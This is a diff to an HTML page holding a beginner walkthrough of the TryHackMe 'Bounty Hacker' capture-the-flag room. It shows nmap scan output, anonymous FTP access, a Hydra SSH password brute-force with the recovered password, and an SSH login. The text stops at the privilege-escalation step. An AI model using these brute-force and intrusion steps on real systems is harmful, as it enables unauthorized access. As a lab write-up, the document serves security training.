@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture The Flag Walkthrough</title>
+    <title>Bounty Hacker Beginner-Friendly Walkthrough</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -22,12 +22,12 @@
     </style>
 </head>
 <body>
-    <h1>Capture The Flag Walkthrough</h1>
+    <h1>Bounty Hacker CTF on TryHackMe</h1>
 
     <h2>Introduction</h2>
     <p>You boasted about your elite hacker skills in a bar, and now a group of Bounty Hunters challenges you to prove it.</p>
 
-    <h2>Step 1: Network Scanning with NMAP</h2>
+    <h2>Step 1: Getting Started with Network Scanning with NMAP</h2>
     <pre>
         nmap -A $IP
     </pre>
@@ -35,34 +35,213 @@
 
     <h3>Results:</h3>
     <pre>
-        [NMAP output here]
+        ┌──(root㉿rex)-[/home/rexadmin]
+└─# nmap -A 10.10.253.164
+Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2024-02-09 21:19 IST
+Nmap scan report for 10.10.253.164
+Host is up (0.33s latency).
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.6.29.34
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|*Can't get directory listing: TIMEOUT
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+|*  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Aggressive OS guesses: HP P2000 G3 NAS device (89%), Linux 2.6.32 (88%), Linux 2.6.32 - 3.1 (88%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (88%), Linux 3.7 (88%), Linux 5.0 (88%), Linux 5.0 - 5.4 (88%), Linux 5.1 (88%), Ubiquiti AirOS 5.5.9 (88%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (88%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   280.92 ms 10.6.0.1
+2   ... 3
+4   331.60 ms 10.10.253.164
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.23 seconds
     </pre>
 
-    <h2>Step 2: Exploring FTP</h2>
+    <h2>Step 2: Start Enumeration with FTP</h2>
     <pre>
-        ftp 10.10.253.164
-    </pre>
-    <p>We connect to the FTP server using the anonymous login credentials obtained from the NMAP scan.</p>
+        ┌──(root㉿rex)-[/home/rexadmin/ctf]
+        └─# ftp 10.10.253.164
 
-    <h3>Files Found:</h3>
-    <pre>
-        task.txt
-        locks.txt
-    </pre>
+Connected to 10.10.253.164.
+220 (vsFTPd 3.0.3)
+Name (10.10.253.164:rexadmin): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
 
-    <h2>Step 3: Retrieving Files</h2>
-    <pre>
-        ftp> get task.txt
-        ftp> get locks.txt
-    </pre>
-    <p>We download the files <code>task.txt</code> and <code>locks.txt</code> for further analysis.</p>
+<h3>You get in. Voila!</h3>
 
+ftp> ls
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+
+<h3>We can see two files in pwd. And, we have to see what is on’em.</h3>
+        
+ftp> get task.txt
+local: task.txt remote: task.txt
+229 Entering Extended Passive Mode (|||10064|)
+ftp: Can't connect to `10.10.253.164:10064': Connection timed out
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+100% |*************************|    68      233.00 KiB/s    00:00 ETA
+226 Transfer complete.
+68 bytes received in 00:00 (0.21 KiB/s)
+
+ftp> get locks.txt
+local: locks.txt remote: locks.txt
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+100% |*************************|   418        2.04 MiB/s    00:00 ETA
+226 Transfer complete.
+418 bytes received in 00:00 (1.00 KiB/s)
+
+**Both files** task.txt and locks.txt downloaded!
+        
+     <p>Now, cat these files and you get the flag for Q3. And, save these files, they might be used later.</p>
+
+      <h2>Step 3:</h2>
+        
+
+     <p>Now, you have to answer the Q4: **What service can you bruteforce with the text file found?**
+
+This question has two answers, as we can try to brute force the FTP server, it responds with the wrong answer. 
+
+Then the second one is SSH. And, yeah, you got it!
+
+Now, you are almost done the half of the room! BRAVO! You can become an elite hacker in the future, just carry on and be persistent.</p> 
+    
     <h2>Step 4: Brute Forcing SSH</h2>
-    <pre>
+        <p>
+    Do you know what is the users password?
+
+To find it you first have to consider the available credentials and if the doesn’t work, then you can  think further!
+
+What we have right now is: 
+
+- 3 open port
+- 1 task.txt file which contains a name that might be a user.
+- 1 locks.txt file which has a wordlist that might be the passwords.
+
+Now, to find the password of the users, you can use a password brute-forcer like Hydra. 
+
+Command: <pre>
         hydra -l lin -P locks.txt 10.10.253.164 ssh
     </pre>
-    <p>We use Hydra to perform a brute force attack on the SSH server using the username <code>lin</code> and the passwords from <code>locks.txt</code>.</p>
 
+Command Description: 
+
+Here's a breakdown of the command:
+
+- **`hydra`**: invokes the Hydra password-cracking tool
+- **-l `lin`**: specifies the username to use for the attack
+- **-P `locks.txt`**: specifies the file containing a list of passwords to try
+- **`10.10.253.164`**: specifies the IP address of the SSH server to attack
+- **`ssh`**: specifies the protocol to use for the attack (in this case, SSH)
+
+Now, hit that command!
+    </p>
+       <pre>
+        ┌──(root㉿rex)-[/home/rexadmin/ctf]
+        └─# hydra -l lin -P locks.txt 10.10.253.164 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-09 23:36:06
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.10.253.164:22/
+[22][ssh] host: 10.10.253.164   login: lin   password: RedDr4gonSynd1cat3
+
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-09 23:36:14
+       </pre>
+
+<p>Now, we have a user and his password. Let’s now try to ssh via these credentials.</p>
+        <pre>
+┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# ssh [lin@10.10.253.164](mailto:lin@10.10.253.164)
+
+The authenticity of host '10.10.253.164 (10.10.253.164)' can't be established.
+ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.253.164' (ED25519) to the list of known hosts.
+[lin@10.10.253.164](mailto:lin@10.10.253.164)'s password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com/)
+- Management: [https://landscape.canonical.com](https://landscape.canonical.com/)
+- Support: https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+        </pre>
+        <p> 
+            
+BRAVO! You are an elite HACKER! You just got the user.txt flag. 
+
+Wait, but actually, we are looking for the users password, right?
+
+Let’s think about where can be the additional users other than lin…..
+
+Wait, we just did FTP till now, let’s look for other ports: its HTTP 80.
+
+But it looks like just a conversation between these guys, they can be the users. 
+
+Lets create a users.txt file and add all the names on it using nano text editor.
+        </p>
+        <pre>
+            ┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# nano users.txt
+
+#Add all those names you find on the webpage.
+
+┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# ls
+
+locks.txt  rockyou.txt  task.txt  users.txt
+
+┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# cat users.txt
+
+Spike
+Jet
+Ed
+Edward
+Ein
+Faye
+        </pre>
+        
     <h2>Step 5: Escalating Privileges</h2>
     <pre>
         sudo -l
